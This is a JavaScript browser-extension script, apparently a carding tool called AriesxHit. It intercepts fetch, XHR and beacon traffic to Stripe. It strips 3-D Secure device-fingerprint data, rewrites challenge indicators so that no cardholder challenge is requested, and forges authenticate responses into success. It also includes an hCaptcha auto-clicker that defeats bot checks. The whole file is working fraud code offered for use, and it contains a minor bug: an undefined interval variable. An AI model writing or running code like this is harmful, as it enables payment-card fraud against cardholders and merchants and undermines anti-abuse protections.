// ARIESXHIT 3DS BYPASS CORE
// Injected directly into page context at document_start
// Based on ABUSE BYPASSER v4.2 logic with AriesxHit integration

(function() {
  'use strict';
  if (window.__ARIES_3DS_CORE__) return;
  window.__ARIES_3DS_CORE__ = true;

let bypassCount = 0;
let detectCount = 0;

  // ==================== STRIPE DETECTION ====================
  const STRIPE_DOMAINS = ['stripe.com', 'stripe.network'];
  const STRIPE_PATHS = ['/v1/3ds', '/v1/payment', '/v1/setup', '/v1/tokens', '/v1/sources', '/authenticate', '/confirm', '/challenge'];

  function isStripe(url) {
    if (!url) return false;
    try {
      const u = new URL(url, location.href);
      return STRIPE_DOMAINS.some(d => u.hostname.includes(d)) || STRIPE_PATHS.some(p => u.pathname.includes(p));
    } catch {
      return STRIPE_DOMAINS.some(d => url.includes(d)) || STRIPE_PATHS.some(p => url.includes(p));
    }
  }

  function isCritical(url) {
    if (!url) return false;
    const critical = ['3ds2/authenticate', '3ds2/challenge', 'verify_challenge', 'three_d_secure'];
    return critical.some(c => url.toLowerCase().includes(c));
  }

  // ==================== LOGGING ====================
  function log3DS(type, message) {
    console.log(`%c[3DS-${type.toUpperCase()}] ${message}`, `color: ${type === 'bypass' ? '#22c55e' : type === 'error' ? '#ef4444' : '#888'}; font-weight: bold`);
  }

  // Debug function to log all requests
  function debugRequest(url, method, body, type) {
    console.log(`%c[3DS-DEBUG] ${method} ${url.substring(0, 60)} (${type})`, 'color: #888; font-size: 10px');
    if (body && body.length < 500) {
      console.log(`%c[3DS-DEBUG] Body: ${body.substring(0, 200)}...`, 'color: #666; font-size: 10px');
    }
  }

  // ==================== ARIESxHIT INTEGRATION NOTIFICATIONS ====================

  // Send notifications through AriesxHit's existing system
  function notifyAriesxHit(type, message, card = null) {
    console.log(`[3DS-${type.toUpperCase()}] ${message}`);

    // Send to AriesxHit background script
    window.postMessage({
      type: 'aries-3ds-bypass',
      subtype: type,
      message: message,
      card: card,
      timestamp: Date.now()
    }, '*');
  }

  // ==================== REQUEST BODY PARSING ====================

  // Parse request body from various formats
  function bodyToString(body) {
    if (typeof body === 'string') return body;
    if (body instanceof FormData) {
      const params = new URLSearchParams();
      for (const [key, value] of body.entries()) {
        params.append(key, value);
      }
      return params.toString();
    }
    if (body instanceof URLSearchParams) return body.toString();
    if (body instanceof ArrayBuffer || body instanceof Uint8Array) {
      return new TextDecoder().decode(body);
    }
    try {
      return JSON.stringify(body);
    } catch {
      return String(body);
    }
  }

  // ==================== 3DS BYPASS LOGIC ====================

  // Decode and modify three_d_secure device_data
  function decodeAndModify(bodyStr) {
    if (!bodyStr) return { modified: false, body: bodyStr };

    let result = bodyStr;
    let modified = false;

    try {
      // Extract the encoded parameter
      const match = bodyStr.match(/three_d_secure%5Bdevice_data%5D=([^&]*)/);
      if (match) {
        const encoded = match[1];
        const urlDecoded = decodeURIComponent(encoded);
        const jsonStr = atob(urlDecoded);
        const obj = JSON.parse(jsonStr);

        // Remove browser fingerprinting data
        const toRemove = ['browser_locale', 'timezone', 'user_agent', 'screen_width', 'screen_height', 'color_depth', 'locale', 'language'];
        toRemove.forEach(key => {
          if (obj.hasOwnProperty(key)) {
            delete obj[key];
            modified = true;
          }
        });

        if (modified) {
          // Re-encode
          const newJson = JSON.stringify(obj);
          const newBase64 = btoa(newJson);
          const newEncoded = encodeURIComponent(newBase64);
          result = bodyStr.replace(match[0], `three_d_secure%5Bdevice_data%5D=${newEncoded}`);

          bypassCount++;
          log3DS('bypass', `Device fingerprint removed (${bypassCount} total)`);
          notifyAriesxHit('bypass', 'Device fingerprint bypassed');
        }
      }
    } catch (e) {
      log3DS('error', `Failed to decode device_data: ${e.message}`);
    }

    return { modified, body: result };
  }

  // Modify 3DS2 authenticate request parameters
  function modify3DSAuthenticateRequest(bodyStr) {
    if (!bodyStr) return { modified: false, body: bodyStr };

    let result = bodyStr;
    let modified = false;

    try {
      // Challenge prevention - modify challenge_indicator and requestor_challenge_ind
      if (bodyStr.includes('challenge_indicator') && bodyStr.includes('three_ds_requestor_challenge_ind')) {
        // Change challenge_indicator from '01' (challenge required) to '04' (no challenge)
        result = result.replace(/challenge_indicator=01/g, 'challenge_indicator=04');

        // Change three_ds_requestor_challenge_ind from '01' to '02' (no challenge requested)
        result = result.replace(/three_ds_requestor_challenge_ind=01/g, 'three_ds_requestor_challenge_ind=02');

        modified = true;
        bypassCount++;
        log3DS('bypass', `Challenge prevention applied (${bypassCount} total)`);
        notifyAriesxHit('bypass', 'Challenge prevention applied');
      }
    } catch (e) {
      log3DS('error', `Failed to modify authenticate request: ${e.message}`);
    }

    return { modified, body: result };
  }

  // Modify 3DS2 authenticate response
  function modify3DSResponse(responseText) {
    if (!responseText) return { modified: false, response: responseText };

    let modified = false;
    let result = responseText;

    try {
      const response = JSON.parse(responseText);

      // Force success status
      if (response.state === 'requires_action') {
        response.state = 'succeeded';
        modified = true;
      }

      if (response.status === 'requires_action') {
        response.status = 'succeeded';
        modified = true;
      }

      // Modify authentication result
      if (response.authentication_result) {
        if (response.authentication_result.status === 'challenge_required') {
          response.authentication_result.status = 'Y'; // Success
          modified = true;
        }

        if (response.authentication_result.status === 'Y') {
          // Ensure other fields indicate success
          response.authentication_result.eci = '05';
          response.authentication_result.three_d_secure_version = '2.2.0';
          modified = true;
        }
      }

      if (modified) {
        result = JSON.stringify(response);
        bypassCount++;
        log3DS('bypass', `Response spoofed to success (${bypassCount} total)`);
        notifyAriesxHit('bypass', '3DS response spoofed to success');
      }

    } catch (e) {
      log3DS('error', `Failed to modify response: ${e.message}`);
    }

    return { modified, response: result };
  }

  // ==================== NETWORK INTERCEPTION ====================

  // Intercept fetch requests
  const origFetch = window.fetch;
  window.fetch = async function(input, init) {
    let url, method, headers, body;

    if (input instanceof Request) {
      url = input.url;
      method = input.method;
      headers = new Headers(input.headers);
      if (input.body) {
        try { const clone = input.clone(); body = await clone.text(); } catch(e) { body = null; }
      }
    } else {
      url = String(input || '');
      method = init?.method || 'GET';
      headers = init?.headers ? new Headers(init.headers) : new Headers();
      body = init?.body;
    }

    // Convert body to string if needed
    if (body && typeof body !== 'string') {
      body = bodyToString(body);
    }

    if (isStripe(url)) {
      detectCount++;
      debugRequest(url, method, body, 'fetch');

      if (isCritical(url)) log3DS('detect', `Critical request: ${method} ${url}`);

      let bodyResult = body;

      // Apply modifications
      const decodeResult = decodeAndModify(bodyResult);
      if (decodeResult.modified) bodyResult = decodeResult.body;

      if (url.includes('/3ds2/authenticate')) {
        const authResult = modify3DSAuthenticateRequest(bodyResult);
        if (authResult.modified) bodyResult = authResult.body;
      }

      // Create modified request
      const newInit = { ...init };
      if (bodyResult !== body) {
        if (method === 'POST' && bodyResult.includes('=')) {
          headers.set('Content-Type', 'application/x-www-form-urlencoded');
        }
        newInit.body = bodyResult;
      }
      newInit.headers = headers;

      try {
        const response = await origFetch.call(window, url, newInit);

        // Modify response if needed
        if (url.includes('/3ds2/authenticate')) {
          const responseClone = response.clone();
          const responseText = await responseClone.text();
          const modifiedResponse = modify3DSResponse(responseText);

          if (modifiedResponse.modified) {
            return new Response(modifiedResponse.response, {
              status: response.status,
              statusText: response.statusText,
              headers: response.headers
            });
          }
        }

        return response;
      } catch (e) {
        log3DS('error', `Fetch failed: ${e.message}`);
        throw e;
      }
    }

    return origFetch.call(window, input, init);
  };

  // Intercept XMLHttpRequest
  const XHR = XMLHttpRequest;
  const origOpen = XHR.prototype.open;
  const origSend = XHR.prototype.send;

  XHR.prototype.open = function(method, url) {
    this._ariesUrl = String(url || '');
    this._ariesMethod = method;
    return origOpen.apply(this, arguments);
  };

  XHR.prototype.send = function(body) {
    const url = this._ariesUrl;
    const method = this._ariesMethod;

    if (isStripe(url)) {
      detectCount++;
      debugRequest(url, method, body, 'xhr');

      if (isCritical(url)) log3DS('detect', `Critical XHR: ${method} ${url}`);

      let bodyStr = bodyToString(body);

      // Apply modifications
      const decodeResult = decodeAndModify(bodyStr);
      if (decodeResult.modified) bodyStr = decodeResult.body;

      if (url.includes('/3ds2/authenticate')) {
        const authResult = modify3DSAuthenticateRequest(bodyStr);
        if (authResult.modified) bodyStr = authResult.body;
      }

      // Override response handling
      const origOnLoad = this.onload;
      const origOnReadyStateChange = this.onreadystatechange;

      this.onreadystatechange = function() {
        if (this.readyState === 4 && url.includes('/3ds2/authenticate')) {
          try {
            const modifiedResponse = modify3DSResponse(this.responseText);
            if (modifiedResponse.modified) {
              Object.defineProperty(this, 'responseText', {
                get: () => modifiedResponse.response
              });
              Object.defineProperty(this, 'response', {
                get: () => modifiedResponse.response
              });
            }
          } catch (e) {
            log3DS('error', `Failed to modify XHR response: ${e.message}`);
          }
        }

        if (origOnReadyStateChange) origOnReadyStateChange.apply(this, arguments);
      };

      if (bodyStr !== bodyToString(body)) {
        if (method === 'POST' && bodyStr.includes('=')) {
          this.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        }
        body = bodyStr;
      }

      return origSend.call(this, body);
    }

    return origSend.call(this, body);
  };

  // Intercept sendBeacon
  if (navigator.sendBeacon) {
    const origBeacon = navigator.sendBeacon.bind(navigator);
    navigator.sendBeacon = function(url, data) {
      if (isStripe(url)) {
        let bodyStr = data;
        if (data instanceof URLSearchParams) bodyStr = data.toString();
        else if (data instanceof FormData) {
          const params = new URLSearchParams();
          for (const [key, value] of data.entries()) {
            params.append(key, value);
          }
          bodyStr = params.toString();
        }

        debugRequest(url, 'BEACON', bodyStr, 'beacon');

        // Apply modifications
        const decodeResult = decodeAndModify(bodyStr);
        if (decodeResult.modified) bodyStr = decodeResult.body;

        if (url.includes('/3ds2/authenticate')) {
          const authResult = modify3DSAuthenticateRequest(bodyStr);
          if (authResult.modified) bodyStr = authResult.body;
        }

        // Convert back to appropriate format
        if (data instanceof FormData) {
          const formData = new FormData();
          const params = new URLSearchParams(bodyStr);
          for (const [key, value] of params.entries()) {
            formData.append(key, value);
          }
          data = formData;
        } else if (bodyStr !== data) {
          data = bodyStr;
        }
      }

      return origBeacon(url, data);
    };
  }

  // ==================== HCaptcha Auto-Clicker ====================
  // New hCaptcha auto-solver by vdx

  const EVENT_TYPE = "hcap-event";
  const MSG_INIT = "Hcap initialized.";

  function dispatcher(type, message) {
      document.dispatchEvent(
          new CustomEvent(EVENT_TYPE, {
              detail: { type, message }
          })
      );
  }

  function autoClickCaptcha() {
    // wait haha
    const checkbox = document.querySelector('#anchor-state > #checkbox');

    if (checkbox) {
      // Gfff
      dispatcher("info", "Hcapctaha Bypassing......");
      const clicks = Math.floor(Math.random() * 2) + 1; // 1 or 2 clicks

      console.log(`[HCaptcha] Clicking ${clicks} time(s)`);

      // Lamaoooo
      for (let i = 0; i < clicks; i++) {
        checkbox.click();  // gey clikeckekkk
        console.log(`[HCaptcha] Click ${i + 1} done`);
      }
    } else {
      console.log('[HCaptcha] Checkbox not found');
    }
  }

  function waitForHCaptchaSolved({ intervalMs = 500, timeoutMs = 60000 } = {}) {
      return new Promise((resolve, reject) => {
          const start = Date.now();

          const timer = setInterval(() => {
              const respEl =
                  document.querySelector('textarea[name="h-captcha-response"]') ||
                  document.querySelector('input[name="h-captcha-response"]');

              if (respEl && respEl.value.trim() !== "") {
                  clearInterval(timer);
                  resolve(respEl.value.trim());
                  dispatcher("info", "Wew! Hcapctaha Bypassed!");
                  console.log('[HCaptcha] ✅ hCaptcha successfully bypassed!');
                  return;
              }

              if (Date.now() - start > timeoutMs) {
                  clearInterval(timer);
                  reject(new Error("Timeout waiting for hCaptcha"));
                  console.log('[HCaptcha] ❌ Timeout waiting for hCaptcha response');
              }
          }, intervalMs);
      });
  }

  // Initialize hCaptcha auto-clicker
  function initHCaptchaAutoClicker() {
    console.log('[HCaptcha] Initializing auto-solver...');

    // Monitor for hCaptcha elements
    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
          mutation.addedNodes.forEach((node) => {
            if (node.nodeType === Node.ELEMENT_NODE) {
              // Check if hCaptcha iframe was added
              if (node.matches && node.matches('iframe[src*="hcaptcha"]')) {
                console.log('[HCaptcha] hCaptcha iframe detected, starting auto-solve...');
                setTimeout(() => {
                  autoClickCaptcha();
                  waitForHCaptchaSolved().catch(err => console.log('[HCaptcha] Error:', err.message));
                }, 1000 + Math.random() * 1000); // Random delay 1-2 seconds
              }
              // Also check for checkbox directly
              else if (node.matches && node.matches('#checkbox')) {
                console.log('[HCaptcha] Checkbox element detected, attempting click...');
                setTimeout(() => {
                  autoClickCaptcha();
                  waitForHCaptchaSolved().catch(err => console.log('[HCaptcha] Error:', err.message));
                }, 500 + Math.random() * 500); // Random delay 0.5-1 second
              }
            }
          });
        }
      });
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true
    });

    // Also check periodically for existing hCaptcha
    setInterval(() => {
      const existingCheckbox = document.querySelector('#anchor-state > #checkbox');
      if (existingCheckbox && !existingCheckbox.hasAttribute('data-clicked')) {
        console.log('[HCaptcha] Found existing checkbox, attempting auto-solve...');
        autoClickCaptcha();
        waitForHCaptchaSolved().catch(err => console.log('[HCaptcha] Error:', err.message));
      }
    }, 2000 + Math.random() * 1000); // Check every 2-3 seconds

    // Store interval ID for potential cleanup
    window.__ariesHCaptchaInterval = intervalId;

    console.log('[HCaptcha] Auto-solver initialized and monitoring...');
  }

  // ==================== ARIESXHIT INTEGRATION ====================

  // Signal to AriesxHit core that 3DS bypass is ready
  window.__ARIES_3DS_READY__ = true;

  // Listen for AriesxHit state updates
  window.addEventListener('message', (event) => {
    if (event.data?.type === 'aries-state-update' && event.data.autoHitActive !== undefined) {
      // Adjust bypass behavior based on auto-hit state
      console.log('[3DS] Auto-hit state changed:', event.data.autoHitActive);
    }
  });


  // ==================== STARTUP ====================
  console.log('%c[ARIES 3DS BYPASS] Core loaded and active - Ready to bypass 3DS!', 'color: #22c55e; font-size: 16px; font-weight: bold; background: #000; padding: 10px;');
  console.log('%c[ARIES 3DS BYPASS] Monitoring all network requests for Stripe 3DS data...', 'color: #22c55e; font-size: 12px;');

  // Start hCaptcha auto-clicker
  initHCaptchaAutoClicker();

  console.log('[ARIES 3DS BYPASS] Ready and active');

})();